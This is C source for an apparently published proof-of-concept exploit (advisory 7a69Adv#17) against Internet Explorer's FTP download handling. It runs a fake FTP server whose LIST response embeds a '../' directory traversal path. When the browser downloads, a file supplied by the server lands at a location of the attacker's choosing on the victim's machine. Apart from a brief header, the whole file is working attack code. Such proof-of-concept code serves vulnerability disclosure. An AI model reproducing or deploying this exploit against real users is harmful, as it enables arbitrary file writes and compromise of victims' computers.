/*
* Internet Explorer FTP download path disclosure ****** proof of concept (7a69Adv#17)
*
* DOES NOT WORK USING PASV MODE, YOU MUST CODE IT IF YOU WANT !!!
*
* by Albert Puigsech Galicia (7a69)
*
*/

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

#define MAX_BUF 1024
#define FTP_PORT 21

int main(int argc, char **argv) {
char ch;
char buffer[MAX_BUF + 1];
char ipbuf[MAX_BUF + 1];
char *local_file, *remote_file;
int sfdmain, sfdses, sfddata;
int readed;
int ip1,ip2,ip3,ip4,port1,port2;
int fd;
struct stat st;
struct sockaddr_in ftpmain = { AF_INET, htons(FTP_PORT), INADDR_ANY };
struct sockaddr_in ftpdata;

if (argc < 3) {
printf("\t7a69Adv#17 - Internet Explorer FTP download path disclosure prof of concept\n");
printf("Use:\n");
printf("\t%s <local_file> <remote_file>\n", argv[0]);
exit(0);
}

local_file = argv[1];
remote_file = argv[2];

if ((fd = open(local_file, O_RDONLY)) == -1) {
perror("open()");
exit(-1);
}

if ((sfdmain = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
perror("socket()");
exit(-1);
}

if (bind(sfdmain, (struct sockaddr *)&ftpmain, sizeof(struct sockaddr)) == -1) {
perror("bind()");
exit(-1);
}

if (listen(sfdmain, 1) == -1) {
perror("listen()");
exit(-1);
}

if ((sfdses = accept(sfdmain, NULL, NULL)) == -1) {
perror("accept()");
exit(-1);
}

write(sfdses, "200 OK\r\n", 8);

while ((readed = read(sfdses, buffer, MAX_BUF)) > 0) {
buffer[readed] = 0;
printf(">> %s", buffer);
if (!strncmp(buffer, "noop", 4)) write(sfdses, "200 OK\r\n", 8);
else if (!strncmp(buffer, "USER ", 5)) write(sfdses, "331 OK\r\n", 8);
else if (!strncmp(buffer, "PASS ", 5)) write(sfdses, "230 OK\r\n", 8);
else if (!strncmp(buffer, "CWD ", 4)) write(sfdses, "250 OK\r\n", 8);
else if (!strncmp(buffer, "PWD", 3)) write(sfdses, "257 \"/\"\r\n", 9);
else if (!strncmp(buffer, "TYPE ", 5)) write(sfdses, "200 OK\r\n", 8);
else if (!strncmp(buffer, "PORT ", 5)) {
sscanf(&buffer[5], "%i,%i,%i,%i,%i,%i", &ip1, &ip2, &ip3, &ip4, &port1, &port2);
snprintf(ipbuf, MAX_BUF, "%i.%i.%i.%i", ip1, ip2, ip3, ip4);
ftpdata.sin_family = AF_INET;
ftpdata.sin_addr.s_addr = inet_addr(ipbuf);
ftpdata.sin_port = htons(port1*256+port2);
if ((sfddata = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
perror("socket()");
exit(-1);
}
if (connect(sfddata, (struct sockaddr *)&ftpdata, sizeof(struct sockaddr)) == -1) {
write(sfdses, "421 OK\r\n", 8);
} else {
write(sfdses, "220 OK\r\n", 8);
}
}
else if (!strncmp(buffer, "LIST", 4)) {
write(sfdses, "150 OK\r\n", 8);
snprintf(buffer, MAX_BUF, "-rwxrwxrwx 1 0 0 1 Dec 08 07:36 
/../../../../../../../../../../..%s\r\n", remote_file);
write(sfddata, buffer, strlen(buffer));
close(sfddata);
write(sfdses, "226 OK\r\n", 8);

}
else if(!strncmp(buffer, "RETR ", 5)) {
write(sfdses, "150 OK\r\n", 8);
fstat(fd, &st);
while(st.st_size-- > 0) {
read(fd, &ch, 1);
write(sfddata, &ch, 1);
}
close(sfddata);
write(sfdses, "226 OK\r\n", 8);
}
else if (!strncmp(buffer, "QUIT", 4)) {
write(sfdses, "221 OK\r\n", 8);
close(sfdses); close(sfdmain); close(sfddata);
}
else
write(sfdses, "500 WTF\r\n", 9);


}
}

